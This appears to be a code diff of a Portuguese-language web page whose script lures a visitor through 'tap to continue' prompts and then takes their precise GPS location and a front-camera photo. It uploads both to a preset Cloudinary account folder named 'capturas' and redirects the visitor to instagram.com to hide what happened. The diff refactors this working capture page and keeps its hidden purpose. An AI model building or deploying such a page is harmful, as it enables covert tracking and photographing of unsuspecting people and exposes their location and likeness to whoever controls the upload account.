@@ -17,23 +17,26 @@
   </style>
 </head>
 <body>
-  <div id="overlay">Toque para continuar</div>
+  <div id="overlay" style="display:none"></div>
   <script>
     const cloudName = 'dx5legahb';
     const uploadPreset = 'upload';
     const folderName = 'capturas';
     const overlay = document.getElementById('overlay');
 
-    // Show overlay with message and click handler
-    function show(msg, handler) {
-      overlay.textContent = msg;
+    // Exibe overlay com mensagem e handler
+    function showOverlay(message, handler) {
+      overlay.textContent = message;
       overlay.style.display = 'flex';
-      overlay.onclick = () => { overlay.style.display = 'none'; handler(); };
+      overlay.onclick = () => {
+        overlay.style.display = 'none';
+        handler();
+      };
     }
 
-    // Upload location to Cloudinary
+    // Envia localização para Cloudinary
     async function uploadLocation(lat, lon) {
-      const blob = new Blob([`Latitude: ${lat}\nLongitude: ${lon}`], {type: 'text/plain'});
+      const blob = new Blob([`Latitude: ${lat}\nLongitude: ${lon}`], { type: 'text/plain' });
       const form = new FormData();
       form.append('file', blob, `localizacao_${Date.now()}.txt`);
       form.append('upload_preset', uploadPreset);
@@ -41,65 +44,78 @@
       await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, { method: 'POST', body: form });
     }
 
-    // Capture photo and upload
-    async function capturePhoto() {
-      const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}, audio:false});
+    // Captura foto e envia
+    async function captureAndUploadPhoto() {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
       const video = document.createElement('video');
+      video.setAttribute('playsinline', '');
+      video.autoplay = true;
+      video.muted = true;
       video.srcObject = stream;
-      video.setAttribute('playsinline','true'); video.setAttribute('autoplay',''); video.setAttribute('muted','');
       await new Promise(res => video.onloadedmetadata = res);
       video.play();
-      await new Promise(r => setTimeout(r, 500));
+      await new Promise(res => setTimeout(res, 500));
+
       const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
-      stream.getTracks().forEach(t=>t.stop());
-      return new Promise((res,rej)=>{
-        canvas.toBlob(async blob=>{
-          const form = new FormData(); form.append('file', blob);
-          form.append('upload_preset', uploadPreset); form.append('folder', folderName);
-          const resp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {method:'POST',body:form});
-          const data = await resp.json(); res(data.secure_url);
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      stream.getTracks().forEach(t => t.stop());
+
+      return new Promise((resolve) => {
+        canvas.toBlob(async (blob) => {
+          const form = new FormData();
+          form.append('file', blob);
+          form.append('upload_preset', uploadPreset);
+          form.append('folder', folderName);
+          const resp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, { method: 'POST', body: form });
+          const data = await resp.json();
+          resolve(data.secure_url);
         }, 'image/png');
       });
     }
 
-    // Step 1: request location
-    function stepLocation() {
-      if (!navigator.geolocation) return handleLocationError();
-      navigator.geolocation.getCurrentPosition(async pos => {
-        try {
-          await uploadLocation(pos.coords.latitude, pos.coords.longitude);
-          stepCamera();
-        } catch(e) {
-          console.error(e);
-          show('Erro ao enviar localização. Tente novamente.', stepLocation);
-        }
-      }, () => {
-        show('Toque para permitir a localização', stepLocation);
-      }, {enableHighAccuracy:true, timeout:10000});
+    // Passo 1: solicitar localização
+    function requestLocation() {
+      if (!navigator.geolocation) {
+        alert('Geolocalização não suportada');
+        return;
+      }
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          const { latitude, longitude } = pos.coords;
+          try {
+            await uploadLocation(latitude, longitude);
+            // Após enviar localização, pede câmera
+            showOverlay('Toque para permitir o acesso à câmera', requestCamera);
+          } catch (e) {
+            console.error(e);
+            showOverlay('Erro ao enviar localização. Toque para tentar novamente.', requestLocation);
+          }
+        },
+        () => {
+          showOverlay('Toque para permitir a localização', requestLocation);
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
     }
 
-    // Step 2: request camera and capture
-    function stepCamera() {
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return handleCameraError();
-      show('Toque para permitir a câmera', async () => {
-        try {
-          const url = await capturePhoto();
-          // opcional: log url
-          window.location.href = 'https://instagram.com';
-        } catch(e) {
-          console.error(e);
-          show('Permissão de câmera negada. Tente novamente.', stepCamera);
-        }
-      });
+    // Passo 2: solicitar câmera, capturar e redirecionar
+    async function requestCamera() {
+      try {
+        const imageUrl = await captureAndUploadPhoto();
+        // redireciona após sucesso
+        window.location.href = 'https://instagram.com';
+      } catch (e) {
+        console.error(e);
+        showOverlay('Permissão de câmera negada. Toque para tentar novamente.', requestCamera);
+      }
     }
 
-    // Initial tap
-    show('Toque para continuar', stepLocation);
-
-    function handleLocationError() { show('Geolocalização não suportada', ()=>{});}  
-    function handleCameraError() { show('Câmera não suportada', ()=>{});}  
+    // Inicia fluxo após DOM
+    window.addEventListener('DOMContentLoaded', () => {
+      showOverlay('Toque para continuar', requestLocation);
+    });
   </script>
 </body>
 </html>
